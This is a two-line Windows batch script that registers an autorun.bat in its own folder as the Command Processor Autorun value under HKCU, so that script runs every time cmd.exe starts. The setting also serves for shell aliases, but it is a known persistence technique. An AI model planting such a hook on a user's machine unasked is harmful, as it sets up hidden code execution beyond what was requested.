@echo off
reg add "HKCU\Software\Microsoft\Command Processor" /v Autorun /d "%~dp0autorun.bat" /f
